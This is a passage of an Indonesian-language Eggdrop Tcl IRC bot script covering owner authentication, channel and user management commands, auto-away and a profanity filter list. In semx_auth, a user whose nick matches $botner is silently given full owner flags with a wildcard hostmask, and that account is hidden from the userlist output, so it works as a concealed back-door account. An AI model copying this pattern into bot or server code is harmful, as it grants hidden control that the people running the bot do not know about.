    setuser "data" XTRA "BANTIME" 5
    setuser "data" XTRA "BADWORDS" "- pemai cuki pendo luji memek ngentot fuck toket puki"
    saveuser
  } {
    set nick [getuser "data" XTRA "NICK"]
    set nickpass [getuser "data" XTRA "NICKPASS"]
    set realname [getuser "data" XTRA "REALNAME"]
    set jam_on [getuser "data" XTRA "JAM"]
    set ban-time [getuser "data" XTRA "BANTIME"]
    set badwords [getuser "data" XTRA "BADWORDS"]
  }
  foreach x [userlist] {
    chattr $x -Q
  }
}
proc semx_init {init-server} {
  global nickpass basechan
  putserv "NickServ identify $nickpass"
#  if {![validchan [string tolower $basechan]]} {
#    channel add $basechan
#    savechan
#  }
}
proc semx_auth {nick uhost hand text} {
  global botner
  set pw [lindex $text 0]
  if {![validuser $nick]} {
    if {$nick == $botner} {
      set hostmask "$nick!*@*"
      adduser $botner $hostmask
      chattr $botner "fhjlmnoptxZ"
      saveuser
    }
    tidak_kenal $nick
    return 0
  }  
  if {$pw == ""} { postm $nick Format = \002auth password\002; return 0 }
  if {[matchattr $nick n]} {
    if {[matchattr $nick Q]} {
      postm $nick Anda sudah login
    } {
      if {[passwdok $nick "-"]} {
        postm $nick Anda belum set password, Ketik \002pass password\002
        return 0
      }
      if {[passwdok $nick $pw]} {
        chattr $nick +Q
        postm $nick \002Owner..!!!\002
      } {
        postm $nick Password salah..!!!
      }
    }
  }
}

proc ditolak_pub {nick} {
  puthelp "NOTICE $nick :[semx_notc] Anda belum login"
}

proc ditolak_msg {nick} {
  puthelp "PRIVMSG $nick :[semx_notc] Anda belum login"
  return 0
}
proc ditolak_pub {nick} {
  puthelp "NOTICE $nick :[semx_notc] Anda belum login"
  return 0
}

proc tidak_kenal {nick} {
  global semx_tdkknl
  set var_tdkknl [lindex $semx_tdkknl [rand [llength $semx_tdkknl]]]
  puthelp "PRIVMSG $nick :$var_tdkknl"
  return 0
}
proc postm {unick args} {
  puthelp "PRIVMSG $unick :[semx_notc] $args"
}
proc postp {unick args} {
  puthelp "NOTICE $unick :[semx_notc] $args"
}
proc postc {chan args} {
  puthelp "PRIVMSG $chan :$args"
}
proc saveuser {} {
  save
  return 1
}
proc smileyy {} {
  global semx_smiley
  set smile [lindex $semx_smiley [rand [llength $semx_smiley]]]
  return $smile
}
proc purm {chan nick} {
  global urm
  set nurm [lindex $urm [rand [llength $urm]]]
  regsub -all {\$nick} $nurm $nick nurm
  channel set $chan +wboff
  utimer 3 [list puthelp "privmsg $chan :$nurm \003[vrandom][smileyy]\003"]
  utimer 3 [list channel set $chan -wboff]
}
proc pmyvar {chan nick} {
  global myvar
  set nmyvar [lindex $myvar [rand [llength $myvar]]]
  regsub -all {\$nick} $nmyvar $nick nmyvar
  channel set $chan +wboff
  utimer 3 [list puthelp "privmsg $chan :$nmyvar \003[vrandom][smileyy]\003"]
  utimer 3 [list channel set $chan -wboff] 
}
proc semx_join {nick uhost hand chan} {
  global botnick
  if {$nick == $botnick} { return 0 }
  if {[channel get $chan wb]} {
    if {[channel get $chan wboff]} {
      return 0
    } {
      if {[matchattr $nick n] || [matchattr $nick f]} {
        purm $chan $nick
      } {
        pmyvar $chan $nick
      }
    }
  }
}
######################################
#    some proc sections end
######################################
set lenc "abcdefghijklmnopqrstuvwxyz"
set ldec "zyxwvutsrqponmlkjihgfedcba"
set uenc "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
set udec "ZYXWVUTSRQPONMLKJIHGFEDCBA"
######################################
#    autoaway sections
######################################
proc semx_away {min h d m y} {
  global botnick uptime timezone longer awaym
  set totalyear [expr [unixtime] - $uptime]
  if {$totalyear >= 31536000} {
    set yearsfull [expr $totalyear/31536000]
    set years [expr int($yearsfull)]
    set yearssub [expr 31536000*$years]
    set totalday [expr $totalyear - $yearssub]
  }
  if {$totalyear < 31536000} {
    set totalday $totalyear
    set years 0
  }
  if {$totalday >= 86400} {
    set daysfull [expr $totalday/86400]
    set days [expr int($daysfull)]
    set dayssub [expr 86400*$days]
    set totalhour [expr $totalday - $dayssub]
  }
  if {$totalday < 86400} {
    set totalhour $totalday
    set days 0
  }
  if {$totalhour >= 3600} {
    set hoursfull [expr $totalhour/3600]
    set hours [expr int($hoursfull)]
    set hourssub [expr 3600*$hours]
    set totalmin [expr $totalhour - $hourssub]
  }
  if {$totalhour < 3600} {
    set totalmin $totalhour
    set hours 0
  }
  if {$totalmin >= 60} {
    set minsfull [expr $totalmin/60]
    set mins [expr int($minsfull)]
  }
  if {$totalmin < 60} {
    set mins 0
  }
  if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years 01year([vrandom]s01), "} {set yearstext "$years 01year([vrandom]s01), "}
  if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days 01day([vrandom]s01), "} {set daystext "$days 01day([vrandom]s01), "}
  if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours 01hour([vrandom]s01), "} {set hourstext "$hours 01hour([vrandom]s01), "}
  if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins 01minute([vrandom]s01)"} {set minstext "$mins 01minute([vrandom]s01)"}
  if {[string length $mins] == 1} {set mins "0${mins}"}
  if {[string length $hours] == 1} {set hours "0${hours}"}
  set output "${yearstext}${daystext}${hours}:${mins}"
  set output [string trimright $output ", "]
  if {[getuser "data" XTRA "AWAY"]!=""} {
    putserv  "AWAY :[semx_vern] 15u14p01([vrandom]t01)i14m15e: $output 15-14=01([getuser "data" XTRA "AwAY"]01)14=15-"
    } {
      set awaymsg [lindex $awaym [rand [llength $awaym]]]
      regsub -all {%warna%} $awaymsg [vrandom] awaymsg
      putserv  "AWAY :[semx_vern] 15u14p01([vrandom]t01)i14m15e: $output 15-14=01($awaymsg01)14=15-"
    }
  }
######################################
#    autoaway sections end
######################################
######################################
#    command pv sections
######################################
proc semx_msgm {unick uhost hand text} {
  global nick nickpass owner basechan jam_on ban-time badwords botner
  set trigger [lindex $text 0]
  set konten [lindex $text 1]
  set extra1 [lindex $text 2]
  set extra2 [lindex $text 3]
  if {$trigger == "rehash"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    utimer 3 rehash
    foreach x [userlist] {
      chattr $x -Q
    }
    postm $unick Ok Rehashing..!!!
  }
  if {$trigger == "info"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format == \002info #channel\002; return 0 }
    if {[validchan $konten]} {
      set data [channel info $konten]
      postm $unick \002$konten\002 = $data
    } {
      postm $unick Data chan \002$konten\002 tidak ada..!!!
    }
  }
  if {$trigger == "+owner"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$unick != $owner} { postm $unick Anda bukan real-owner; return 0 }
    if {$konten == "" || $konten == "data"} { postm $unick Format == \002+owner nick\002; return 0 }
    if {![validuser $konten]} {
      set hostmask "$konten!*@*"
      adduser $konten $hostmask
      chattr $konten "fhjlmnoptxZ"
      postm $unick \002$konten\002 ditambah ke daftar Owner
      postm $konten $unick menambahkan anda ke daftar Owner
      postm $konten ketik \002pass password\002
      saveuser
    } {
      if {[matchattr $konten n]} {
        postm $unick \002$konten\002 Sudah ada didaftar Owner
        return 0
      }
      if {[matchattr $konten f]} {
        chattr $konten "fhjlmnoptxZ"
        postm $unick \002$konten\002 ditambah ke daftar Owner
        postm $konten $unick menambahkan anda ke daftar Owner
        postm $konten ketik \002pass password\002
      }
    }
  }
  if {$trigger == "-owner"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$unick != $owner} { postm $unick Anda bukan real-owner; return 0 }
    if {$konten == ""} { postm $unick Format == \002-owner nick\002; return 0 }
    if {[validuser $konten]} {
      if {[matchattr $konten n]} {
        deluser $konten
        postm $unick \002$konten\002 di hapus dari daftar Owner
        saveuser
      } {
        postm $unick \002$konten\002 tidak berada dalam daftar Owner
      }
    } {
      postm $unick \002$konten\002 tidak berada dalam daftar Owner
    }
  }
  if {$trigger == "chanset"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} { postm $unick :Format = \002chanset #channel -/+(flag)\002; return 0 }
    if {![validchan $konten]} { postm $unick chan \002$konten\002 tidak ada..!!!; return 0 }
    catch { channel set $konten $extra1 }
    postm $unick chanset \002$konten $extra1\002
    savechan
    return 0
  }
  if {$trigger == "botnick"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} { postm $unick :Format = \002botnick nick password\002; return 0 }
    setuser "data" XTRA "NICK" $konten
    setuser "data" XTRA "NICKPASS" $extra1
    set nick $konten
    set nickpass $extra1
    postm $unick Botnick menjadi \002$konten\002
    utimer 3 [list putquick "NickServ identify $nickpass"]
    saveuser
  }
  if {$trigger == "restart"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    putserv "QUIT :[semx_notc] Restarted by $unick"
  }
  if {$trigger == "part"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = part \#channel; return 0 }
    if {[string tolower $konten] == [string tolower $basechan]} { postm $unick Tidak bisa part BaseChan; return 0 }
    if {![validchan $konten]} { postm $unick Tidak berada di chan $konten; return 0 }
    channel remove $konten
    postm $unick Part chan $konten
    savechan
  }
  if {$trigger == "+chan"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format == \002+chan \#channel\002; return 0 }
    if {[validchan $konten]} { postm $unick Sudah berada di chan $konten; return 0 }
    channel add $konten
    postm $unick Channel \002$konten\002 ditambahkan
    savechan
  }
  if {$trigger == "away"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} {
      setuser "data" XTRA "AWAY" ""
      postm $unick Away \00304OFF\003
      putserv "AWAY"
      saveuser
    } {
      set awaym [lrange $text 1 end]
      setuser "data" XTRA "AWAY" $awaym
      postm $unick Away di set ke ($awaym)
      putserv "AWAY :$awaym"
      saveuser
    }
  }
  if {$trigger == "realname"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002realname contohrealname\002; return 0 }
    set varrealname [lrange $text 1 end]
    setuser "data" XTRA "REALNAME" $varrealname
    postm $unick Realname di ganti ke > $varrealname
    putserv "QUIT :[semx_notc] Ganti Realname oleh $unick"
    saveuser
  }
  if {$trigger == "userlist"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    foreach x [userlist] {
      if {$x == "data" || $x == $botner} { continue }
      append auser "$x ([chattr $x])  "
    }
    puthelp "PRIVMSG $unick :[semx_notc] $auser"
  }
  if {$trigger == "+friend"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+friend nick\002; return 0 }
    if {![validuser $konten]} {
      set hostmask "$konten!*@*"
      adduser $konten $hostmask
      chattr $konten +f-hp
      postm $unick \002$konten\002 ditambahkan ke daftar Friend
      saveuser
    }
  }
  if {$trigger == "-friend"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $konten == "data"} { postm $unick Format = \002-friend nick\002; return 0 }
    if {[validuser $konten]} {
      if {[matchattr $konten n]} {
        postm $unick Anda tidak dapat menghapus Owner
        return 0
      }
      deluser $konten
      postm $unick Friend \002$konten\002 di hapus
      saveuser
    } {
      postm $unick \002$konten\002 tidak berada dalam daftar Friend
    }
  }
  if {$trigger == "code"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002code tescode\002; return 0 }
    puthelp "PRIVMSG $unick :ZIP     = [zip $konten]"
    puthelp "PRIVMSG $unick :DEZIP   = [dezip $konten]"
    puthelp "PRIVMSG $unick :ZIP32   = [zip32 $konten]"
    puthelp "PRIVMSG $unick :DEZIP32 = [dezip32 $konten]"
    puthelp "PRIVMSG $unick :lines   = [lines $konten]"
    puthelp "PRIVMSG $unick :unsix   = [unsix $konten]"
  }
  if {$trigger == "+seen"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+seen \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten +seen
      postm $unick \002seen\002 aktif di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "+guard"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+guard \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten +guard
      postm $unick \002guard\002 aktif di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "+ping"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+ping \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten +ping
      postm $unick \002ping\002 aktif di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "+wb"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+wb \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten +wb
      postm $unick \002wb\002 aktif di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "+port"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+port \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten +port
      postm $unick \002port\002 aktif di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "+whois"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+whois \#channel\002; return 0 }
    semx_+whois $unick "" "pm" $konten
  }
  if {$trigger == "-whois"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-whois \#channel\002; return 0 }
    semx_-whois $unick "" "pm" $konten
  }
  if {$trigger == "+dns"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002+dns \#channel\002; return 0 }
    semx_+dns $unick "" "pm" $konten
  }
  if {$trigger == "-dns"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-dns \#channel\002; return 0 }
    semx_-dns $unick "" "pm" $konten
  }
  if {$trigger == "-seen"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-seen \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten -seen
      postm $unick \002seen\002 dimatikan di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "-guard"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-guard \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten -guard
      postm $unick \002guard\002 dimatikan di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "-ping"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-ping \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten -ping
      postm $unick \002ping\002 dimatikan di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "-wb"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-wb \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten -wb
      postm $unick \002wb\002 dimatikan di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "-port"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002-port \#channel\002; return 0 }
    if {[validchan $konten]} {
      channel set $konten -port
      postm $unick \002port\002 dimatikan di chan \002$konten\002
      savechan
    } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
  }
  if {$trigger == "channels"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    foreach c [channels] {
      append nchan "\["
      if {[botisvoice $c]} { append nchan "+" }
      if {[botishalfop $c]} { append nchan "%" }
      if {[botisop $c]} { append nchan "@" }
      if {[channel get $c seen]} { append nchan \00304S\003 }
      if {[channel get $c ping]} { append nchan \00304P\003 }
      if {[channel get $c wb]} { append nchan \00304W\003 }
      if {[channel get $c port]} { append nchan \00304O\003 }
      if {[channel get $c guard]} { append nchan \00304G\003 }
      if {[channel get $c whois]} { append nchan \00304H\003 }
      if {[channel get $c dns]} { append nchan \00304D\003 }
      append nchan "\00302$c\003\] "
    }
    puthelp "PRIVMSG $unick :[semx_notc] $nchan \[\00304S\003:seen|\00304P\003:ping|\00304W\003:wb\|\00304O\003:port|\00304G\003:guard|\00304H\003:whois|\00304D\003:dns\]"
  }
  if {$trigger == "ping"} {
    postm $unick \002pong\002
  }
  if {$trigger == "+flag"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} { postm $unick Format = \002+flag nick f\002; return 0 }
    if {[validuser $konten]} {
      set bflag [string index $extra1 0]
      if {[string match "*$bflag*" "fhjlmnoptxZQWF"]} { postm $unick Maaf flag ini tidak bisa diset manual; return 0 }
      if {[matchattr $konten $bflag]} {
        postm $unick user \002$konten\002 sudah memiliki flag \002$bflag\002..!!!
      } {
        set oflag [chattr $konten]
        chattr $konten $bflag
        postm $unick flag \002$konten\002 berubah dari ($oflag) menjadi ([chattr $konten])
      }
    } {
      postm $unick user \002$konten\002 tidak ada..!!!
    }
  }
  if {$trigger == "-flag"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} { postm $unick Format = \002-flag nick f\002; return 0 }
    if {[validuser $konten]} {
      set bflag [string index $extra1 0]
      if {[string match "*$bflag*" "fjmnotxkZQWF"]} { postm $unick Maaf flag ini tidak bisa diset manual; return 0 }
      if {![matchattr $konten $bflag]} {
        postm $unick user \002$konten\002 tidak memiliki flag \002$bflag\002..!!!
      } {
        set oflag [chattr $konten]
        chattr $konten -$bflag
        postm $unick flag \002$konten\002 berubah dari ($oflag) menjadi ([chattr $konten])
      }
    } {
      postm $unick user \002$konten\002 tidak ada..!!!
    }
  }
  if {$trigger == "die"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    die "[semx_notc] Dimatikan oleh \002$unick\002"
  }
  if {$trigger == "jam"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick \002$jam_on\002; return 0 }
    if {$konten == "on"} {
      setuser "data" XTRA "JAM" "on"
      postm $unick publik jam di aktifkan..!!!
      set jam_on "on"
      saveuser
    } elseif {$konten == "off"} {
      setuser "data" XTRA "JAM" "off"
      postm $unick publik jam di matikan..!!!
      set jam_on "off"
      saveuser
    } {
      postm $unick Format \002jam (on/off)\002
    }
  }
  if {$trigger == "msg"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} { postm $unick Format = \002msg (\#channel/nick)\002 }
    set pesan [lrange $text 2 end]
    if {[validchan $konten]} {
      putserv "PRIVMSG $konten :$pesan"
      postm $unick dikirim ke chan \002$konten\002 
    } {
      putserv "PRIVMSG $konten :$pesan"
      postm $unick dikirim ke nick \002konten\002 
    }
  }
  if {$trigger == "bantime"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == ""} {
      postm $unick [getuser "data" XTRA "BANTIME"]
    } {
      set angka "0123456789"
      set tesangka [split $konten ""]
      foreach data $tesangka {
        if {![string match "*$data*" $angka]} { postm $unick format \002bantime <angka>\002; return 0 }
      }
      if {$konten > 120} { postm $unick tidak bisa melebihi 120 menit, 0 untuk waktu tak terbatas; return 0 }
      setuser "data" XTRA "BANTIME" $konten
      postm $unick bantime di set \002$konten\002 menit..!!!
      set ban-time $konten
      foreach nchan [channels] {
        catch { channel set $nchan ban-time $konten }
      }
      saveuser
    }
  }
  if {$trigger == "chanmode"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} { postm $unick Format = \002chanmode \#channel <mode>\002; return 0 }
    if {![validchan $konten]} { 
      postm $unick \002$konten\002 tidak valid..!!!
      } {
        channel set $konten chanmode $extra1
        postm $unick mode chan \002$konten\002 menjadi [channel get $konten chanmode]
        savechan
      }
  }
  if {$trigger == "+avoice"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {![validuser $konten]} { postm $unick user $konten tidak ada.. tambah sebagai friend terlebih dahulu; return 0 }
    semx_avoice $unick pm $konten
  }
  if {$trigger == "-avoice"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {![validuser $konten]} { postm $unick user $konten tidak ada..; return 0 }
    semx_-avoice $unick pm $konten
  }
  if {$trigger == "jump"} {
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {$konten == "" || $extra1 == ""} {postm $unick Foramt = \002jump server port (password)\002; return 0 }
    set data [split $extra1 ""]
    foreach ndata $data {
      if {![regexp {[\+,0-9]} $ndata]} {
        postm $unick port $extra1 tidak valid...!!!
        return 0
      }
    }
    putserv "QUIT :[semx_notc] Jump server"
    if {$extra2 == ""} {
      utimer 2 [list jump $konten $extra1]
    } {
      utimer 2 [list jump $konten $extra1 $extra2]
    }
  }
  if {$trigger == "+badword"} {
    set bword [getuser "data" XTRA "BADWORDS"]
    if {$konten == ""} {
      postm $unick Badword = $bword
      return 0
    }
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {[lsearch -exact [string tolower $bword] [string tolower $konten]] != -1} {
      postm $unick $konten sudah berada di daftar Badwords
    } {
      append bword " $konten"
      set badwords $bword
      setuser "data" XTRA "BADWORDS" $bword
      postm $unick $konten di tambahkan ke daftar Badwords
      saveuser
    }
  }
  if {$trigger == "-badword"} {
    set bword [getuser "data" XTRA "BADWORDS"]
    if {$konten == ""} {
      postm $unick Badword = $bword
      return 0
    }
    if {![matchattr $unick Q]} { ditolak_msg $unick; return 0 }
    if {[lsearch -exact [string tolower $bword] [string tolower $konten]] != -1} {
      regsub -all " $konten" $bword "" bword
      set badwords $bword
      setuser "data" XTRA "BADWORDS" $bword
      postm $unick $konten dihapus dari daftar Badwords
      saveuser
    } {
      postm $unick $konten tidak berada di daftar Badwords
    }
  }
}
######################################
#    command pv sections end
######################################
######################################
#    public command proc sections
######################################
proc semx_channels {unick uhost hand chan text} {
    foreach c [channels] {
      append nchan "\["
      if {[botisvoice $c]} { append nchan "+" }
      if {[botishalfop $c]} { append nchan "%" }
      if {[botisop $c]} { append nchan "@" }
      if {[channel get $c seen]} { append nchan \00304S\003 }
      if {[channel get $c ping]} { append nchan \00304P\003 }
      if {[channel get $c wb]} { append nchan \00304W\003 }
      if {[channel get $c port]} { append nchan \00304O\003 }
      if {[channel get $c guard]} { append nchan \00304G\003 }
      if {[channel get $c whois]} { append nchan \00304H\003 }
      if {[channel get $c dns]} { append nchan \00304D\003 }
      append nchan "\00302$c\003\] "
    }
    puthelp "NOTICE $unick :[semx_notc] $nchan \[\00304S\003:seen|\00304P\003:ping|\00304W\003:wb|\00304O\003:port|\00304G\003:guard|\00304H\003:whois|\00304D\003:dns\]"
}
proc semx_cycle {unick uhost hand chan text konten} {
  global cyclem
  set varcyclem [lindex $cyclem [rand [llength $cyclem]]]
  regsub -all {%warna%} $varcyclem [vrandom] varcyclem
  if {$konten == ""} {
    putserv "PART $chan :$varcyclem"
    } {
      if {[validchan $konten]} {
        putserv "PART $konten :$varcyclem"
        } {
          postp $unick chan \002$konten\002 tidak valid..!!!
        }
      } 
    }
proc semx_part {unick uhost hand chan text konten} {
  global basechan
    if {$konten == ""} {
      channel remove $chan
      postp $unick Part chan \002$chan\002..!!!
      savechan
    } {
      if {[string tolower $konten] == [string tolower $basechan]} { postp $unick Tidak bisa part dari BaseChan; return 0 }
      if {[validchan $konten]} {
        channel remove $konten
        postp $unick Part chan \002$konten\002..!!!
        savechan
      } {
        postp $unick Chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_userlist {unick uhost hand chan text} {
  global botner
    foreach x [userlist] {
      if {$x == "data" || $x == $botner} { continue }
      append auser "$x ([chattr $x])  "
    }
    puthelp "NOTICE $unick :[semx_notc] $auser"
}
proc semx_+chan {unick uhost hand chan text konten} {
    if {$konten == ""} { postp $unick Format = \002`+chan \#channel\002 }
    if {![validchan $konten]} {
      channel add $konten
      postp $unick Chan \002$konten\002 di tambahkan..!!!
      savechan
    } {
      postp $unick Chan \002$konten\002 sudah ada..!!!
    }
}
proc semx_+friend {unick uhost hand chan text konten} {
    if {$konten == ""} { postp $unick Format = \002`+friend nick\002; return 0 }
    if {![validuser $konten]} {
      set hostmask "$konten!*@*"
      adduser $konten $hostmask
      chattr $konten +f-hp
      postp $unick \002$konten\002 ditambahkan ke daftar Friend
      saveuser
    } {
      postp $unick \002$konten\002 sudah ada dalam daftar Friend
    }
}
proc semx_+owner {unick uhost hand chan text konten} {
    if {![validuser $konten]} {
      set hostmask "$konten!*@*"
      adduser $konten $hostmask
      chattr $konten "fhjlmnoptxZ"
      postp $unick \002$konten\002 ditambah ke daftar Owner
      postm $konten $unick menambahkan anda ke daftar Owner
      postm $konten ketik \002pass password\002
      saveuser
    } {
      if {[matchattr $konten n]} {
        postp $unick \002$konten\002 Sudah ada didaftar Owner
        return 0
      }
      if {[matchattr $konten f]} {
        chattr $konten "fhjmnoptxZ"
        postp $unick \002$konten\002 ditambah ke daftar Owner
        postm $konten $unick menambahkan anda ke daftar Owner
        postm $konten ketik \002pass password\002
      }
    }
}
proc semx_rehash {unick} {
    utimer 3 rehash
    foreach x [userlist] {
      chattr $x -Q
    }
    postp $unick Ok Rehashing..!!!
}
proc semx_+seen {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan +seen
      postp $unick \002seen\002 aktif..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten +seen
        postp $unick \002seen\002 aktif di chan \002$konten\002..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_+guard {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan +guard
      postp $unick \002guard\002 aktif..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten +guard
        postp $unick \002guard\002 aktif di chan \002$konten\002..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_+ping {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan +ping
      postp $unick \002ping\002 aktif..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten +ping
        postp $unick \002ping\002 aktif di chan \002$konten\002..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_+wb {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan +wb
      postp $unick \002wb\002 aktif..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten +wb
        postp $unick \002wb\002 aktif di chan \002$konten\002..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_+port {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan +port
      postp $unick \002port\002 aktif..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten +port
        postp $unick \002port\002 aktif di chan \002$konten\002..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_-seen {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan -seen
      postp $unick \002seen\002 dimatikan..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten -seen
        postp $unick \002seen\002 dimatikan..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_-guard {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan -guard
      postp $unick \002guard\002 dimatikan..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten -guard
        postp $unick \002guard\002 dimatikan..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_-ping {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan -ping
      postp $unick \002ping\002 dimatikan..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten -ping
        postp $unick \002ping\002 dimatikan..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_-wb {unick chan text konten} {
    if {$konten == ""} {
      channel set $chan -wb
      postp $unick \002wb\002 dimatikan..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten -wb
        postp $unick \002wb\002 dimatikan..!!!
        savechan
      } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_-port {unick uhost hand chan text konten} {
    if {$konten == ""} {
      channel set $chan -port
      postp $unick \002port\002 dimatikan..!!!
      savechan
    } {
      if {[validchan $konten]} {
        channel set $konten -port
        postp $unick \002port\002 dimatikan..!!!
        savechan
      } {
